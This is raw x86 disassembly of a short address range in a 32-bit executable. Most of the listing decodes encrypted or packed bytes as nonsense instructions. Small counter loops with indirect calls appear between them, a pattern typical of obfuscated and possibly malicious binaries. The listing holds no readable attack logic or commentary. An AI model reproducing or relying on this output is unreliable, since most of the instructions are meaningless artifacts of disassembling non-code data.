  40a147:	and    BYTE PTR [ebp-0x749c5862],bl
  40a14d:	aaa    
  40a14e:	pop    es
  40a14f:	mov    ebp,0x4a55f63f
  40a154:	fcom   DWORD PTR [esi]
  40a156:	fdivr  st,st(5)
  40a158:	mov    BYTE PTR cs:[eax+0xb],cl
  40a15c:	cwde   
  40a15d:	jg     0x40a10e
  40a15f:	push   ds
  40a160:	test   DWORD PTR [eax],eax
  40a162:	and    ecx,DWORD PTR ds:0x414f789d
  40a168:	icebp  
  40a169:	sti    
  40a16a:	loop   0x40a190
  40a16c:	xchg   esi,eax
  40a16d:	sti    
  40a16e:	xchg   BYTE PTR [ecx+0x6e],dl
  40a171:	mov    eax,ds:0x733e8a96
  40a176:	pop    edi
  40a177:	push   ebp
  40a178:	repz in al,dx
  40a17a:	jns    0x40a155
  40a17c:	inc    esp
  40a17d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a17e:	(bad)  
  40a17f:	cli    
  40a180:	adc    ecx,DWORD PTR [eax]
  40a182:	mov    al,ah
  40a184:	(bad)  
  40a186:	and    esp,DWORD PTR [ebx]
  40a188:	xchg   esi,eax
  40a189:	in     eax,0x87
  40a18b:	or     dh,bl
  40a18d:	fimul  DWORD PTR [ebp+0x8]
  40a190:	scas   eax,DWORD PTR es:[edi]
  40a191:	(bad)  
  40a192:	out    dx,al
  40a193:	pop    esi
  40a194:	pop    esp
  40a195:	arpl   sp,dx
  40a197:	nop
  40a198:	xchg   BYTE PTR [ebp+0x40],ah
  40a19b:	mov    ch,0x9a
  40a19d:	dec    eax
  40a19e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a19f:	inc    ebp
  40a1a0:	mov    ebx,DWORD PTR [esi]
  40a1a2:	cdq    
  40a1a3:	push   edx
  40a1a4:	or     edx,eax
  40a1a6:	xor    al,0x25
  40a1a8:	xor    DWORD PTR [ebx+0x1525f628],esp
  40a1ae:	jl     0x40a1f0
  40a1b0:	dec    eax
  40a1b1:	inc    ebp
  40a1b2:	mov    ds:0x3c191c59,eax
  40a1b7:	sub    esp,DWORD PTR [eax-0x3b]
  40a1ba:	cld    
  40a1bb:	mov    ah,0x9c
  40a1bd:	adc    al,0xbf
  40a1bf:	sub    al,0x1c
  40a1c1:	nop
  40a1c2:	sub    cl,ah
  40a1c4:	dec    eax
  40a1c5:	adc    DWORD PTR [esi],ebx
  40a1c7:	fidiv  WORD PTR [edx]
  40a1c9:	or     DWORD PTR [edi-0x61199b91],ebp
  40a1cf:	jle    0x40a214
  40a1d1:	or     BYTE PTR [ecx],bh
  40a1d3:	dec    edi
  40a1d4:	retf   0xc9f
  40a1d7:	popa   
  40a1d8:	mov    cl,0x83
  40a1da:	mov    WORD PTR [esi],ss
  40a1dc:	fcompp 
  40a1de:	in     al,dx
  40a1df:	mov    ds:0xc432a597,eax
  40a1e4:	inc    ax
  40a1e6:	or     eax,0x3c01c8cc
  40a1eb:	pop    esp
  40a1ec:	gs pop ebx
  40a1ee:	pop    ebx
  40a1ef:	test   BYTE PTR [esi*4+0xcd21747],dh
  40a1f6:	pcmpeqd mm6,QWORD PTR [esp+eax*2+0x632a8759]
  40a1fe:	lea    edx,[edx-0x59]
  40a201:	mov    al,0x2e
  40a203:	cmp    al,0x54
  40a205:	in     eax,0x86
  40a207:	inc    ebx
  40a208:	push   ebp
  40a209:	(bad)  [ebx-0x27]
  40a20c:	fldcw  WORD PTR [ebp+ebp*8+0x60]
  40a210:	repnz imul edx,edi,0xffffff84
  40a214:	jnp    0x40a22f
  40a216:	fcomp  DWORD PTR [ebx+eiz*1-0x53]
  40a21a:	dec    eax
  40a21b:	int    0x8e
  40a21d:	and    al,BYTE PTR [eax]
  40a21f:	jmp    0x40a21b
  40a221:	xchg   esp,eax
  40a222:	test   BYTE PTR [esi],al
  40a224:	outs   dx,DWORD PTR ds:[esi]
  40a225:	sahf   
  40a226:	loopne 0x40a29d
  40a228:	cmp    eax,0x428f7781
  40a22d:	pushf  
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fded,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fded
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fded,edx
  40a263:	cmp    DWORD PTR ds:0x42fded,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fded,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e3e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e228,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e80f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	popf   
  40a2c5:	in     al,0x87
  40a2c7:	aas    
  40a2c8:	inc    ebp
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2aa
  40a2d1:	cs push ebx
  40a2d3:	inc    esp
  40a2d4:	jle    0x40a309
  40a2d6:	(bad)  
  40a2d7:	xchg   ebx,eax
  40a2d8:	jl     0x40a342
  40a2da:	push   edx
  40a2db:	pop    ecx
  40a2dc:	js     0x40a30d
  40a2de:	jo     0x40a318
  40a2e0:	mov    WORD PTR [edi-0x2f],ds
  40a2e3:	push   0x1a5f5ec0
  40a2e8:	push   esi
  40a2e9:	push   es
  40a2ea:	push   ebx
  40a2eb:	inc    esp
  40a2ec:	jge    0x40a2fb
  40a2ee:	sahf   
  40a2ef:	and    BYTE PTR [ecx+ecx*4-0x492b02b5],0x6
  40a2f7:	sar    DWORD PTR [edx+ecx*1-0x6de12dc4],1
  40a2fe:	lahf   
  40a2ff:	push   cs
  40a300:	inc    eax
  40a301:	outs   dx,BYTE PTR ds:[esi]
  40a302:	add    al,0xf3
  40a304:	aaa    
  40a305:	xor    eax,DWORD PTR [eax]
  40a307:	shr    BYTE PTR [edx-0x231e175],cl
  40a30d:	add    ah,BYTE PTR [edi+0x28]
  40a310:	mov    ah,0xdb
  40a312:	xchg   ebp,ebx
  40a314:	push   ebx
  40a315:	dec    edx
  40a316:	jmp    0xb58d5a9b
  40a31b:	sti    
  40a31c:	xor    al,0x49
  40a31e:	inc    esi
  40a31f:	cmp    ch,BYTE PTR [edi-0x59ea632]
  40a325:	sub    al,0x72
  40a327:	popa   
  40a328:	or     ah,BYTE PTR [ebx-0x7022bb5a]
  40a32e:	es cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a331:	not    BYTE PTR [ebx]
  40a333:	mov    ds,WORD PTR [edi+edx*4+0x78]
  40a337:	ja     0x40a39a
  40a339:	sub    eax,0x5c36b87e
  40a33e:	mov    bl,0x2c
  40a340:	mov    ds:0xf4639c94,eax
  40a345:	or     eax,0x3cef2ab1
  40a34a:	ins    DWORD PTR es:[edi],dx
  40a34b:	dec    edi
  40a34c:	mov    fs,WORD PTR [edx-0x2fd1b960]
  40a352:	lods   eax,DWORD PTR ds:[esi]
  40a353:	mov    gs,ebx
  40a355:	imul   edi,DWORD PTR [ebx+0x5],0x2de4a84
  40a35c:	test   ebx,edx
  40a35e:	daa    
  40a35f:	fwait
  40a360:	popa   
  40a361:	adc    bh,BYTE PTR [edi+0xc79d3a0]
  40a367:	or     al,0xe7
  40a369:	lahf   
  40a36a:	repnz add bl,BYTE PTR fs:[edx-0x5074d12e]
  40a372:	mov    ch,0xf7
  40a374:	xor    al,0x5
  40a376:	and    bh,bh
  40a378:	pop    esp
  40a379:	ins    DWORD PTR es:[edi],dx
  40a37a:	rol    ch,1
  40a37c:	jno    0x40a351
  40a37e:	inc    esp
  40a37f:	mov    ds:0x3b15e3f5,eax
  40a384:	les    edx,FWORD PTR [eax-0x5f]
  40a387:	dec    ecx
  40a388:	ret    0x5371
  40a38b:	mov    edx,0x1da19708
  40a390:	repnz cwde 
  40a392:	mov    ebp,0x88b2a16e
  40a397:	add    dh,dh
  40a399:	rcl    BYTE PTR ds:0x529a472,1
  40a39f:	adc    esi,DWORD PTR [esi+esi*4]
  40a3a2:	out    dx,al
  40a3a3:	test   al,0x0
  40a3a5:	ins    BYTE PTR es:[edi],dx
  40a3a6:	xchg   ebx,eax
  40a3a7:	mov    fs:0x1ba3425e,eax
  40a3ad:	xchg   BYTE PTR [edi],bh
  40a3af:	lods   eax,DWORD PTR ds:[esi]
  40a3b0:	cwde   
  40a3b1:	fs icebp 
  40a3b3:	dec    ebx
  40a3b4:	arpl   WORD PTR es:[edi-0x5e2e67dc],sp
  40a3bb:	mov    esp,0x122b3b1a
  40a3c0:	jecxz  0x40a43f
  40a3c2:	(bad)  
  40a3c3:	cli    
  40a3c4:	xor    BYTE PTR [ecx-0x24148677],dl
  40a3ca:	dec    ecx
  40a3cb:	cld    
  40a3cc:	add    al,0xaa
  40a3ce:	pop    ds
  40a3cf:	sbb    cl,bl
  40a3d1:	hlt    
  40a3d2:	addr16 inc ebp
  40a3d4:	jecxz  0x40a3b3
  40a3d6:	sub    esp,DWORD PTR [edi+0x79]
  40a3d9:	mov    fs,esi
  40a3db:	adc    eax,0x5c70d1ce
  40a3e0:	popf   
  40a3e1:	into   
  40a3e2:	popaw  
  40a3e4:	ret    0x361a
  40a3e7:	clc    
  40a3e8:	jo     0x40a466
  40a3ea:	out    0xa4,eax
  40a3ec:	jo     0x40a3c6
  40a3ee:	aas    
  40a3ef:	jl     0x40a426
  40a3f1:	hlt    
  40a3f2:	adc    eax,0x571fa693
  40a3f7:	mov    bl,ch
  40a3f9:	cmp    DWORD PTR [esi],0xffffff82
  40a3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fd:	pmullw mm6,QWORD PTR [edi+0x21c715cd]
  40a404:	sbb    dl,BYTE PTR [eax+0x77]
  40a407:	push   ebx
  40a408:	inc    edi
  40a409:	jns    0x40a472
  40a40b:	out    dx,al
  40a40c:	pop    ebx
  40a40d:	and    DWORD PTR [edx-0x77],eax
  40a410:	cmp    eax,0xffffffd4
  40a413:	cli    
  40a414:	push   0xffffff89
  40a416:	mov    ecx,0x341bc0b9
  40a41b:	cmp    edi,ecx
  40a41d:	dec    edx
  40a41e:	sbb    BYTE PTR [ebp+0x1f],bh
  40a421:	jmp    0xa2a9:0xf15f195f
  40a428:	out    0x29,al
  40a42a:	in     eax,0xdf
  40a42c:	sub    DWORD PTR [edx+0x41],esi
  40a42f:	inc    esp
  40a430:	or     eax,0xa91229a0
  40a435:	or     edx,DWORD PTR [edx]
  40a437:	gs out 0xc1,eax
  40a43a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a43c:	sub    bl,BYTE PTR [edx]
  40a43e:	retf   
  40a43f:	in     al,dx
  40a440:	xchg   esp,eax
  40a441:	push   ss
  40a442:	retf   0xcc8c
  40a445:	rol    BYTE PTR [edi],1
  40a447:	jge    0x40a4bd
  40a449:	popf   
  40a44a:	lods   al,BYTE PTR ds:[esi]
  40a44b:	imul   ecx,eax,0xb22002e3
  40a451:	frstor [eax+0x7b]
  40a454:	mov    ebp,0x69bb69b1
  40a459:	add    edx,DWORD PTR [ecx+0x346c84da]
  40a45f:	popa   
  40a460:	add    bl,dl
  40a462:	int    0xfb
  40a464:	ror    eax,0x41
  40a467:	pusha  
  40a468:	adc    eax,0xb40cbe87
  40a46d:	aas    
  40a46e:	(bad)  
  40a46f:	call   0xd48d16bb
  40a474:	and    dl,BYTE PTR [ebx]
  40a476:	pop    esp
  40a477:	cdq    
  40a478:	adc    cl,bl
  40a47a:	mov    edx,0x66ee4ca0
  40a47f:	fwait
  40a480:	jmp    0x7eb179eb
  40a485:	stc    
  40a486:	emms   
  40a488:	sbb    DWORD PTR [ebx+0x43],ebp
  40a48b:	shr    BYTE PTR [ebx-0x5a3dcc55],1
  40a491:	push   ss
  40a492:	mov    eax,ds:0xaa38b08c
  40a497:	sub    DWORD PTR gs:[ecx+0x5e],edx
  40a49b:	xlat   BYTE PTR ds:[ebx]
  40a49c:	pop    ebx
  40a49d:	or     esi,DWORD PTR [ecx]
  40a49f:	adc    al,0xa8
  40a4a1:	inc    ebx
  40a4a2:	addr16 mov eax,ds:0x5eb1
  40a4a6:	out    dx,eax
  40a4a7:	push   ds
  40a4a8:	sbb    dh,bl
  40a4aa:	add    eax,0x2c69bad0
  40a4af:	stos   BYTE PTR es:[edi],al
  40a4b0:	mov    cl,0xc4
  40a4b2:	mov    cl,0x4b
  40a4b4:	sbb    BYTE PTR [esi],bl
  40a4b6:	fist   WORD PTR [esi-0x2d]
  40a4b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4ba:	mov    esi,0xf32933e5
  40a4bf:	les    edi,FWORD PTR [edi+0x38]
  40a4c2:	mov    eax,0xe4ced811
  40a4c7:	dec    ecx
  40a4c8:	mov    ebx,0xfe6bfdba
  40a4cd:	sub    ecx,0xf5670dc0
  40a4d3:	cs call 0x1cdeeb1d
  40a4d9:	rol    BYTE PTR [esi-0x7491e63e],1
  40a4df:	in     al,0x69
  40a4e1:	mov    edi,0x62fa0f33
  40a4e6:	xor    bh,BYTE PTR [ebp+ebp*2+0x7419b584]
  40a4ed:	xchg   edx,eax
  40a4ee:	fcmovnu st,st(2)
  40a4f0:	inc    ebx
  40a4f1:	jecxz  0x40a475
  40a4f3:	cmp    BYTE PTR [esi],0xe0
  40a4f6:	pop    es
  40a4f7:	pop    edx
  40a4f8:	and    eax,0xa36201fd
  40a4fd:	mov    BYTE PTR ss:[ecx],al
  40a500:	xor    bh,dh
  40a502:	add    eax,0x76f498e1
  40a507:	mov    ch,0x87
  40a509:	mov    bh,0x9b
  40a50b:	cmp    ebx,ebx
  40a50d:	loope  0x40a520
  40a50f:	nop
  40a510:	pop    esi
  40a511:	pop    esp
  40a512:	and    al,0xeb
  40a514:	dec    ebp
  40a515:	retf   0x99a5
  40a518:	pop    es
  40a519:	loopne 0x40a547
  40a51b:	inc    esi
  40a51c:	sbb    al,0x5
  40a51e:	popa   
  40a51f:	mov    edi,0xacd1222e
  40a524:	pop    edx
  40a525:	jecxz  0x40a4cf
  40a527:	or     esi,ebx
  40a529:	cmp    edx,DWORD PTR [ebx-0x4212af96]
  40a52f:	inc    esi
  40a530:	addr16 or al,0xcd
  40a533:	sar    esp,0x0
  40a536:	xchg   DWORD PTR [ecx+0x321e5f57],ebp
  40a53c:	lock mov ds:0x65ccd241,al
  40a542:	xor    ecx,esi
  40a544:	rcr    DWORD PTR [edi],cl
  40a546:	in     eax,0x12
  40a548:	mov    ch,0xa7
  40a54a:	mov    ch,0xe
  40a54c:	ret    
  40a54d:	or     eax,0x1e940af7
  40a552:	xchg   ecx,eax
  40a553:	mov    bl,0xcc
  40a555:	dec    ecx
  40a556:	inc    esi
  40a557:	xchg   edi,eax
  40a558:	push   ss
  40a559:	add    eax,0x92dc9dd4
  40a55e:	add    eax,DWORD PTR [ebp-0x55cec66]
  40a564:	test   DWORD PTR [esi+eiz*1+0x7c],0xc4029503
  40a56c:	push   edi
  40a56d:	inc    edx
  40a56e:	rcr    DWORD PTR [ebp-0x21],cl
  40a571:	jo     0x40a525
  40a573:	std    
  40a574:	sbb    BYTE PTR [eax-0xc],ch
  40a577:	ins    BYTE PTR es:[edi],dx
  40a578:	test   eax,0x276a1f48
  40a57d:	fdivr  QWORD PTR [eax+0x20]
  40a580:	mov    edx,0x751a569e
  40a585:	cmp    eax,0x243d3f2d
  40a58a:	jp     0x40a52d
  40a58c:	(bad)  
  40a58d:	fst    st(3)
  40a58f:	pop    esp
  40a590:	enter  0x819d,0xdf
  40a594:	and    BYTE PTR [ebp-0xd],cl
  40a597:	sti    
  40a598:	ja     0x40a560
  40a59a:	sub    DWORD PTR [esi+0x3ddac6d8],edx
  40a5a0:	jg     0x40a547
  40a5a2:	in     eax,dx
  40a5a3:	push   esi
  40a5a4:	mov    al,ds:0x46197cfd
  40a5a9:	fild   WORD PTR [ebp+0x2b362de2]
  40a5af:	in     al,0xa5
  40a5b1:	in     eax,dx
  40a5b2:	mov    ss,ecx
  40a5b4:	shr    DWORD PTR [edx+0xc94ab9c],1
  40a5ba:	pusha  
  40a5bb:	stos   DWORD PTR es:[edi],eax
  40a5bc:	rol    BYTE PTR [eax],cl
  40a5be:	push   0xffffffa8
  40a5c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5c1:	dec    esi
  40a5c2:	mov    bh,0xd
  40a5c4:	ja     0x40a57b
  40a5c6:	cwde   
  40a5c7:	daa    
  40a5c8:	test   eax,0xb9faaaf5
  40a5cd:	mov    ebx,0x153920a8
  40a5d2:	repnz mov ds:0x1447328f,eax
  40a5d8:	popf   
  40a5d9:	push   0x2
  40a5db:	imul   eax,DWORD PTR [esi],0xfffffff9
  40a5de:	and    esp,DWORD PTR [edi+0x4c]
  40a5e1:	sbb    BYTE PTR [ebx],ah
  40a5e3:	mov    edx,DWORD PTR [ebx+0x4663838d]
  40a5e9:	push   ebx
  40a5ea:	repnz adc edi,DWORD PTR [edx]
  40a5ed:	dec    edx
  40a5ee:	dec    ecx
  40a5ef:	in     al,0x12
  40a5f1:	lds    edi,FWORD PTR [ebx-0x48f5d18d]
  40a5f7:	xor    eax,0xbaf39f23
  40a5fc:	jecxz  0x40a62b
  40a5fe:	mov    ds:0x9b860277,eax
  40a603:	push   ebp
  40a604:	xor    esi,ecx
  40a606:	push   ecx
  40a607:	sti    
  40a608:	adc    eax,0xe1c5486d
  40a60d:	fadd   DWORD PTR [edi+0xbfc057c]
  40a613:	sbb    dl,BYTE PTR ds:0xe8447825
  40a619:	inc    eax
  40a61a:	mov    dh,0x2f
  40a61c:	xchg   esp,eax
  40a61d:	jl     0x40a65b
  40a61f:	mov    ch,0x2b
  40a621:	xchg   edx,eax
  40a622:	or     ch,BYTE PTR [esi+0x3bb4c8d7]
  40a628:	loopne 0x40a66a
  40a62a:	push   ax
  40a62c:	jns    0x40a61a
  40a62e:	cmp    esi,esp
  40a630:	push   ds
  40a631:	jl     0x40a650
  40a633:	(bad)  
  40a634:	jmp    0x40a604
  40a636:	jmp    0x4b6c3482
  40a63b:	push   ds
  40a63c:	sub    bl,0x13
  40a63f:	iret   
  40a640:	jnp    0x40a5c3
  40a642:	(bad)  
  40a643:	inc    ebp
  40a645:	mov    edx,0x8f0bd370
  40a64a:	mov    ah,dl
  40a64c:	xchg   ebp,eax
  40a64d:	mov    ch,0x12
  40a64f:	loope  0x40a696
  40a651:	rol    BYTE PTR [ecx+0x41708007],0xd6
  40a658:	inc    ebx
  40a659:	sub    BYTE PTR ds:0x3f7aba0a,bl
  40a65f:	cwde   
  40a660:	xor    esi,edi
  40a662:	jae    0x40a6c3
  40a664:	xor    dl,ah
  40a666:	dec    ebx
  40a667:	xor    bl,BYTE PTR [ecx-0x2a]
  40a66a:	pusha  
  40a66b:	jne    0x40a63f
  40a66d:	shr    BYTE PTR [eax+0x45c772da],cl
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e7ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e7ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e7ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e7ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e7f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e3eb
  40a6c6:	cmp    DWORD PTR ds:0x42e7ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e7ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e7ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e7ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fddd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fddd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fddd,edx
  40a709:	cmp    DWORD PTR ds:0x42fddd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fddd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e36d
  40a728:	push   0x42e35b
  40a72d:	call   DWORD PTR ds:0x42e647
  40a733:	cmp    DWORD PTR ds:0x42fddd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fddd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fddd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e234
  40a75a:	xor    edi,DWORD PTR ds:0x42e813
  40a760:	mov    DWORD PTR ds:0x42e234,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e813,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fdd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fde5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e813,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fdf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fe09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e230,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e230,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e230,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e2e7
  40a7e8:	push   0x42e33d
  40a7ed:	push   0x42e33d
  40a7f2:	call   DWORD PTR ds:0x42e3ef
  40a7f8:	cmp    DWORD PTR ds:0x42e230,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e230
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e230,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e230
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e230,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e22c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fe6e
  40a839:	add    DWORD PTR ds:0x42e807,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	sbb    eax,0xe4fbb293
  40a858:	icebp  
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a80b
  40a860:	inc    esi
  40a861:	sub    ch,bl
  40a863:	xor    cl,ch
  40a865:	mov    esp,0x36ddfc3e
  40a86a:	push   es
  40a86b:	xor    dh,BYTE PTR [esi+edi*2-0x3a7e1c31]
  40a872:	js     0x40a8aa
  40a874:	mov    al,bh
  40a876:	cmp    BYTE PTR [edi-0x52],dl
  40a879:	mov    edi,0x3ddf0b4c
  40a87e:	jno    0x40a885
  40a880:	jo     0x40a87d
  40a882:	nop
  40a883:	dec    esp
  40a884:	or     al,0x4f
  40a886:	mov    edi,0x144e4ced
  40a88b:	hlt    
  40a88c:	(bad)  
  40a88d:	(bad)  
  40a88e:	jae    0x40a872
  40a890:	jle    0x40a8c0
  40a892:	iret   
  40a893:	int    0x9d
  40a895:	lock neg DWORD PTR [edi-0x74]
  40a899:	das    
  40a89a:	inc    edi
  40a89b:	sar    ecx,1
  40a89d:	(bad)  
  40a89e:	adc    BYTE PTR ds:0xc3a7fed6,al
  40a8a4:	xchg   ebp,eax
  40a8a5:	ins    BYTE PTR es:[edi],dx
  40a8a6:	push   edi
  40a8a7:	adc    al,0x8e
  40a8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8aa:	or     al,0xcb
  40a8ac:	enter  0x6a1b,0x7a
  40a8b0:	inc    ebx
  40a8b1:	push   0xea0b184
  40a8b6:	xchg   edx,eax
  40a8b7:	lahf   
  40a8b8:	mov    dh,0x78
  40a8ba:	pusha  
  40a8bb:	ffreep st(7)
  40a8bd:	dec    ecx
  40a8be:	call   0xecb0:0x7cd17d92
  40a8c5:	add    eax,0x95c3986
  40a8ca:	mov    ?,WORD PTR [ebp+edi*2-0x8]
  40a8ce:	jp     0x40a8ed
  40a8d0:	fsubr  QWORD PTR [esi-0x41]
  40a8d3:	and    al,0x9f
  40a8d5:	ss stos DWORD PTR es:[edi],eax
  40a8d7:	jp     0x40a8b7
  40a8d9:	push   edi
  40a8da:	jecxz  0x40a8f3
  40a8dc:	push   0xd6e74135
  40a8e1:	sbb    al,0xf
  40a8e3:	jg     0x40a898
  40a8e5:	jp     0x40a8e6
  40a8e7:	mov    WORD PTR [edi],?
  40a8e9:	addr16 push cs
  40a8eb:	ret    
  40a8ec:	ja     0x40a8fd
  40a8ee:	xchg   ebp,eax
  40a8ef:	dec    eax
  40a8f0:	sar    DWORD PTR [edi+0xe1e6d44],cl
  40a8f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8f7:	push   esi
  40a8f8:	mov    edx,fs
  40a8fa:	es jecxz 0x40a8ac
  40a8fd:	cmp    ecx,DWORD PTR [eax]
  40a8ff:	(bad)  
  40a900:	stc    
  40a901:	inc    ebx
  40a902:	(bad)  
  40a903:	call   0x8b933469
  40a908:	jge    0x40a97f
  40a90a:	and    eax,0x7717b7fd
  40a90f:	jl     0x40a97a
  40a911:	clc    
  40a912:	mov    cl,0xf2
  40a914:	jno    0x40a923
  40a916:	adc    al,0x5f
  40a918:	mov    DWORD PTR [edi],edi
  40a91a:	mov    ecx,0x3d863930
  40a91f:	cmp    BYTE PTR [eax],ch
  40a921:	mov    ch,0x58
  40a923:	ins    BYTE PTR es:[edi],dx
  40a924:	mov    bh,0xb5
  40a926:	or     DWORD PTR [ecx+0x6ddca406],edi
  40a92c:	sub    ah,bl
  40a92e:	jnp    0x40a9ae
  40a930:	inc    ecx
  40a931:	inc    ebx
  40a932:	mov    esi,0x3150a4ee
  40a937:	push   ecx
  40a938:	mov    ah,0x56
  40a93a:	xchg   dl,dl
  40a93c:	pusha  
  40a93d:	jo     0x40a8cc
  40a93f:	ins    DWORD PTR es:[edi],dx
  40a940:	shl    BYTE PTR [edx+eax*4],0xc3
  40a944:	sbb    BYTE PTR [esi-0x66],cl
  40a947:	mov    dh,0xc4
  40a949:	fs dec edi
  40a94b:	sbb    esp,DWORD PTR [edi-0x5d]
  40a94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a94f:	jge    0x40a95b
  40a951:	pop    esp
  40a952:	je     0x40a951
  40a954:	stc    
  40a955:	ficomp DWORD PTR [esi+esi*1]
  40a958:	aam    0xfd
  40a95a:	mov    esp,DWORD PTR [edx-0x79]
  40a95d:	test   DWORD PTR [ecx],edx
  40a95f:	outs   dx,DWORD PTR ds:[esi]
  40a960:	mov    ch,0xaa
  40a962:	daa    
  40a963:	jp     0x40a9cd
  40a965:	das    
  40a966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a967:	xchg   esi,eax
  40a968:	xor    DWORD PTR [eax],0x29
  40a96b:	stos   BYTE PTR es:[edi],al
  40a96c:	inc    edi
  40a96d:	sub    edx,ebx
  40a96f:	icebp  
  40a970:	sub    al,al
  40a972:	leave  
  40a973:	ror    DWORD PTR [ecx],0x65
  40a976:	push   es
  40a977:	mov    edx,0x74b42fbb
  40a97c:	or     DWORD PTR [edi],0xffffff9d
  40a97f:	adc    al,0x7b
  40a981:	pop    eax
  40a982:	repnz ins DWORD PTR es:[edi],dx
  40a984:	popf   
  40a985:	iret   
  40a986:	add    eax,0xbcd7a132
  40a98b:	or     al,0xdd
  40a98d:	imul   ebx,DWORD PTR [ebx],0xfffffffb
  40a990:	fld    DWORD PTR [ebp+0x34]
  40a993:	cmp    al,0xb1
  40a995:	in     eax,dx
  40a996:	dec    esp
